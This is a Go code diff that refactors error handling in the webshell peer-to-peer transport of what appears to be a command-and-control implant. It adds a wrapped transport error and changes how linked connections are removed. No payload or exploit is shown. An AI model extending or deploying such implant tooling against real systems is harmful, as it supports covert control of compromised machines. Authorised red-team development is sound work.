@@ -5,6 +5,7 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/xml"
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
@@ -30,6 +31,7 @@ type Arguments struct {
 var (
 	internalWebshellConnections     = make(map[string]Arguments)
 	internalWebshellConnectionMutex sync.RWMutex
+	errWebshellTransport            = errors.New("webshell transport failure")
 )
 
 type webshell struct {
@@ -66,7 +68,9 @@ func (c webshell) ProcessIngressMessageForP2P(delegate *structs.DelegateMessage)
 	internalWebshellConnectionMutex.Unlock()
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("Failed to send data to linked p2p connection, %v\n", err))
-		go c.RemoveInternalConnection(delegate.UUID)
+		if errors.Is(err, errWebshellTransport) {
+			requestInternalP2PConnectionRemoval(delegate.UUID, c.ProfileName())
+		}
 	}
 }
 func (c webshell) RemoveInternalConnection(connectionUUID string) bool {
@@ -80,10 +84,9 @@ func (c webshell) RemoveInternalConnection(connectionUUID string) bool {
 		fmt.Printf("connection removed, %s\n", connectionUUID)
 		//printInternalTCPConnectionMap()
 		return true
-	} else {
-		// we don't know about this connection we're asked to close
-		return true
 	}
+	// we don't know about this connection we're asked to close
+	return false
 }
 func (c webshell) AddInternalConnection(connection interface{}) {
 	//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
@@ -161,12 +164,12 @@ func SendWebshellData(sendData []byte, conn Arguments, connectionUUID string) er
 	resp, err := client.Do(req)
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("error client.Do in p2p: %v\n", err))
-		return err
+		return fmt.Errorf("%w: %v", errWebshellTransport, err)
 	}
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll in p2p: %v\n", err))
-		return err
+		return fmt.Errorf("%w: %v", errWebshellTransport, err)
 	}
 	resp.Body.Close()
 	if resp.StatusCode != 200 {
